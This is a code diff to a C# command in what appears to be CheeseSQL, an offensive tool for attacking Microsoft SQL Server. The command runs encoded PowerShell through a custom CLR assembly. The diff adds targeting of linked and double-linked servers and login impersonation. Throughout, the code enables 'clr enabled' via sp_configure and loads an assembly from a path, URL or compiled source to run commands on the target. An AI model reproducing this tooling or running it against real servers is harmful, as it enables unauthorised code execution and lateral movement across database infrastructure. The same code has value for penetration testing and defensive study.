@@ -13,7 +13,7 @@ namespace CheeseSQL.Commands
         public string Description()
         {
             return $"[*] {CommandName}\r\n" +
-                   $"  Description: Execute Encoded PowerShell Command via custom CLR assembly";
+                   $"  Description: Execute Encoded PowerShell Command on directly accessible or Linked SQL Server via custom .NET assemblies";
         }
 
         public string Usage()
@@ -22,77 +22,65 @@ namespace CheeseSQL.Commands
                 $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                 $"/db:DATABASE " +
                 $"/server:SERVER " +
+                $"/target:TARGET " +
                 $"/command:COMMAND " +
                 $"/assembly:DLL " +
                 $"/class:CLASS " +
                 $"/method:METHOD " +
                 $"[/compile] " +
                 $"[/impersonate:USER] " +
+                $"[/impersonate-linked:USER] " +
                 $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
         }
 
         public void Execute(Dictionary<string, string> arguments)
         {
-
+            string connectInfo = "";
             string database = "";
             string connectserver = "";
+            string target = "";
             string assembly = "";
             string clazz = "";
             string cmd = "";
             string method = "";
-            string connectInfo = "";
             string impersonate = "";
-            bool compile = false;
+            string intermediate = "";
+            string impersonate_intermediate = "";
+            string impersonate_linked = "";
 
-            bool sqlauth = false;
+            bool compile = arguments.ContainsKey("/command");
 
-            if (arguments.ContainsKey("/sqlauth"))
-            {
-                sqlauth = true;
-            }
-            if (arguments.ContainsKey("/db"))
-            {
-                database = arguments["/db"];
-            }
-            if (arguments.ContainsKey("/server"))
-            {
-                connectserver = arguments["/server"];
-            }
-            if (arguments.ContainsKey("/compile"))
-            {
-                compile = true;
-            }
-            if (arguments.ContainsKey("/assembly"))
-            {
-                assembly = arguments["/assembly"];
-            }
-            if (arguments.ContainsKey("/command"))
-            {
-                cmd = arguments["/command"];
-            }
-            if (arguments.ContainsKey("/class"))
-            {
-                clazz = arguments["/class"];
-            }
-            if (arguments.ContainsKey("/method"))
-            {
-                method = arguments["/method"];
-            }
-            if (arguments.ContainsKey("/impersonate"))
-            {
-                impersonate = arguments["/impersonate"];
-            }
+            bool sqlauth = arguments.ContainsKey("/sqlauth");
 
-            if (String.IsNullOrEmpty(database))
+            arguments.TryGetValue("/impersonate", out impersonate);
+            arguments.TryGetValue("/intermediate", out intermediate);
+            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
+            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);
+            arguments.TryGetValue("/assembly", out assembly);
+            arguments.TryGetValue("/class", out clazz);
+            arguments.TryGetValue("/method", out method);
+
+            if (!arguments.TryGetValue("/db", out database))
             {
                 Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                 return;
             }
-            if (String.IsNullOrEmpty(connectserver))
+            if (!arguments.TryGetValue("/server", out connectserver))
             {
                 Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                 return;
             }
+            if (!arguments.TryGetValue("/target", out target))
+            {
+                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
+                return;
+            }
+            if (!arguments.TryGetValue("/command", out cmd))
+            {
+                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
+                return;
+            }
+
             if (String.IsNullOrEmpty(assembly) && !compile)
             {
                 Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
@@ -116,6 +104,7 @@ namespace CheeseSQL.Commands
                 method = StringUtils.RandomString(10);
             }
 
+
             SqlConnection connection;
             SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
             if (String.IsNullOrEmpty(connectInfo))
@@ -132,12 +121,8 @@ namespace CheeseSQL.Commands
             string hash;
             string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);
 
-            var procedures = new Dictionary<string, string>();
 
-            if (!String.IsNullOrEmpty(impersonate))
-            {
-                procedures.Add($"Attempting impersonation as {impersonate}..", $"EXECUTE AS LOGIN = '{impersonate}';");
-            }
+            var procedures = new Dictionary<string, string>();
 
             procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
             procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
@@ -157,7 +142,19 @@ namespace CheeseSQL.Commands
             foreach (string step in procedures.Keys)
             {
                 Console.WriteLine("[*] {0}", step);
-                SQLExecutor.ExecuteProcedure(connection, procedures[step]);
+
+                if (String.IsNullOrEmpty(target) && String.IsNullOrEmpty(intermediate))
+                {
+                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
+                }
+                else if (String.IsNullOrEmpty(intermediate))
+                {
+                    SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
+                }
+                else
+                {
+                    SQLExecutor.ExecuteDoubleLinkedProcedure(connection, procedures[step], target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
+                }
             }
 
             connection.Close();
